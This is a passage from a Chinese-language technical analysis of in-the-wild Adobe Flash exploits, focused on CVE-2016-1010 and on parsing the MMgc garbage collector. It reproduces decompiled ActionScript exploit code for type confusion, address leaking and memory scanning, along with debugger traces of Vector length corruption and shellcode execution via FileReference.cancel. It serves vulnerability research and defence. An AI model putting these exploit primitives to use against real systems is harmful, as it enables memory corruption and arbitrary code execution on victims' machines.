          };
        };
        _local_3++;
      };
图20 对ConvolutionFilter进行类型混淆并找出受影响的元素
而在创建完类型混淆的ConvolutionFilter对象后，exploit将借其来定位类型混淆的TextField对象。
    public function TriggerVulnerability():Boolean
    {
      ...
      var _local_7:Boolean;
      var _local_8:int;
      while (_local_8 [0x7FFFFBFE]=0x9A90201E->0x1E Maximum Vector..length:1022
    Location: Main/instance/trig_loaded (L340)
    Writing __AS3__.vec::Vector.[0x7FFFFBFF]=0x7E74027->0x7E74000 Maximum Vector..length:1022
    Location: Main/instance/trig_loaded (L402)
    Writing __AS3__.vec::Vector.[0x7BBE2F8F]=0x931F1F0->0x2A391000 Maximum Vector..length:1022
    Location: Main/instance/Main/instance/write32 (L173)
    > Call flash.net::FileReference QName(PackageNamespace("", null), "cancel"), 0
    Instruction: callpropvoid QName(PackageNamespace("", null), "cancel"), 0
    Called from: Main/instance/trig_loaded:L707
    * Returning from: flash.net::FileReference QName(PackageNamespace("", null), "cancel"), 0
    Writing __AS3__.vec::Vector.[0x7BBE2F8F]=0x2A391000->0x931F1F0 Maximum Vector..length:1022
    Location: Main/instance/Main/instance/write32 (L173)
    Writing __AS3__.vec::Vector.[0x7FFFFFFE]=0x7FFFFFFF->0x1E Maximum Vector..length:1022
    Location: Main/instance/Main/instance/repair_vector (L32)
图25 通过FileReference.cancel调用执行shellcode
### 4 MMgc内存管理垃圾回收器
随着CFG保护的引入，攻击者们又转而在MMgc中查找能够利用的目标，以便完成接下去的代码执行。对MMgc来说，它在许多内部结构的分配上具有可预测的行为，这有助于攻击者们解析MMgc中的对象结构从而找出可利用的目标。
#### 4.1 查找对象
坊间发现的CVE-2016-1010利用样本会通过解析MMgc的内部结构来达成多种目的，此过程需要先泄露对象的内存地址，在此样本中，泄漏的地址来自于一个类型混淆的ConvolutionFilter对象。
    public function TriggerVulnerability():Boolean
    {
      ...
      _local_1.copyPixels(_local_1, _local_2, _local_3);
      if (!(TypeConfuseConvolutionFilter()))
      {
        return (false);
      };
      ...
      gfhfghsdf22432.ghfg43[(bczzzzz + 1)].matrixX = 15;
      gfhfghsdf22432.ghfg43[bczzzzz].matrixX = 15;
      gfhfghsdf22432.ghfg43[((bczzzzz + 6) - 1)].matrixX = 15;
      LeakedObjectAddress = jjj3.hhhh33((jjj3.NumberToDword(ConvolutionFilterArray[ConfusedConvolutionFilterIndex].matrix[0]) & - 4096), 0);
图26 泄漏对象的内存地址
下述代码给出的是EnumerateFixedBlocks(hhh222)函数的起始部分。
    public function EnumerateFixedBlocks (param1:int, param2:Boolean, param3:Boolean = true, param4:___Int64 = undefined) : Array
    {
      ...
      var _loc6_:* = ParseFixedAllocHeaderBySize(param1,param2);
图27
在EnumerateFixedBlocks(hhh222)中会进行ParseFixedAllHeaderBySize和ParseFixedBlock调用
由分析可知，EnumerateFixedBlocks(hhh222)首先会调用ParseFixedAllocHeaderBySize(ghfgfh23)，
而ParseFixedAllocHeaderBySize(ghfgfh23)又会通过LocateFixedAllocAddrBySize(jjj34fdfg)和ParseFixedAllocHeader(cvb45)函数来获取并解析那些具有特定大小的对象。
    public function ParseFixedAllocHeaderBySize(_arg_1:int, _arg_2:Boolean):Object
    {
      var _local_3:ByteArray = gg2rw.readn(LocateFixedAllocAddrBySize(_arg_1, _arg_2), FixedAllocSafeSize);
      return (ParseFixedAllocHeader(_local_3, LocateFixedAllocAddrBySize(_arg_1, _arg_2)));
    }
图28 ParseFixedAllocHeaderBySize(ghfgfh23)函数
#### LocateFixedAllocAddrBySize
LocateFixedAllocAddrBySize(jjj34fdfg)函数会通过arg_1参数来获取堆的大小，其返回值是相应堆块的内存起始地址。
    * Enter: Jdfgdfgd34/instance/jjj34fdfg(000007f0, True)
    * Return: Jdfgdfgd34/instance/jjj34fdfg 00000000`6fb7c36c
图29 LocateFixedAllocAddrBySize(jjj34fdfg)函数返回对象的内存地址，此对象大小为0x7f0
下面这部分代码会基于Flash的版本号和运行平台计算出地址的长度以及FixedAllocSafe结构的大小。
    public function Jdfgdfgd34(_arg_1:*, _arg_2:Object):void
    {
      ...
      AddressLength = 4;
      if (is64bit)
      {
        AddressLength = 8;
      };
      FixedAllocSafeSize = (((8 + (5 * AddressLength)) + AddressLength) + AddressLength);
      if ((cbc4344.FlashVersionTokens[0] >= 20))
      {
        FixedAllocSafeSize = (FixedAllocSafeSize + AddressLength);
      };
图30 确定MMgc中的相关偏移值和对象大小
而DetermineMMgcLocations(hgjdhjjd134134)函数则用于确定MMgc中相关的位置信息。
    public function DetermineMMgcLocations (_arg_1:___Int64, _arg_2:Boolean):Boolean
    {
      var _local_6 = (null as ___Int64);
      var _local_7 = (null as ___Int64);
      var _local_8 = (null as ___Int64);
      var _local_4:int = (jjjj222222lpmc.GetLow(_arg_1) & -4096);
      var _local_3:___Int64 = jjjj222222lpmc.ConverToInt64((_local_4 + jhjhghj23.bitCount), jjjj222222lpmc.GetHigh(_arg_1));
      _local_3 = jjjj222222lpmc.Subtract(_local_3, offset1);
      var _local_5:___Int64 = gg2rw.peekPtr(_local_3);
      _local_7 = new ___Int64(0, 0);
      _local_6 = _local_7;
      if ((((_local_5.high == _local_6.high)) && ((_local_5.low == _local_6.low))))
      {
        return (false);
      };
      cvbc345 = gg2rw.peekPtr(_local_5);
      ...
      if (!(IsFlashGT20))
      {
        _local_6 = SearchDword3F8(_local_5);
        M_allocs01 = _local_6;
        M_allocs02 = _local_6;
      }
      else
      {
        if (_arg_2)
        {
          M_allocs01 = SearchDword3F8(_local_5);
          ...
          M_allocs02 = SearchDword3F8(jjjj222222lpmc.AddInt64(M_allocs01, (FixedAllocSafeSize + 20)));
        }
        else
        {
          M_allocs02 = SearchDword3F8(_local_5);
          ...
          M_allocs01 = SearchDword3F8(jjjj222222lpmc.SubtractInt64(M_allocs02, (FixedAllocSafeSize + 20)));
        };
      };
      ...
    }
DetermineMMgcLocations(hgjdhjjd134134)函数会将对象泄露后得到的相关地址信息交由SearchDword3F8处理，而后SearchDword3F8函数会在内存中搜索DWORD值0x3F8
，这个值似乎是MMgc结构中一个非常重要的标识。
    public function SearchDword3F8(_arg_1:___Int64):___Int64
    {
      var currentAddr:___Int64 = _arg_1;
      var ret:int;
      while (ret != 0x3F8)
      {
        currentAddr = jjjj222222lpmc.SubtractInt64(currentAddr, FixedAllocSafeSize);
        if (IsFlashGT20)
        {
          ret = gg2rw.read4(jjjj222222lpmc.AddInt64(currentAddr, (AddressLength + 4)));
        }
        else
        {
          ret = gg2rw.read4(jjjj222222lpmc.AddInt64(currentAddr, AddressLength));
        };
      };
      return (jjjj222222lpmc.SubtractInt64(currentAddr, (AddressLength + 4)));
    }
图31 SearchDword3F8函数用于扫描内存中的DWORD值0x3f8
接着LocateFixedAllocAddrBySize(jjj34fdfg)函数会借助GetSizeClassIndex方法来获取索引值，并与前面得到的跟Flash版本及平台相关的大小信息一起用于计算FixedAlloc结构头的偏移量。
    public function LocateFixedAllocAddrBySize(_arg_1:int, _arg_2:Boolean):___Int64
    {
      var index:int = jhjhghj23. GetSizeClassIndex(_arg_1);
      var offset:int = ((2 * AddressLength) + (index * FixedAllocSafeSize));
      if (_arg_2)
      {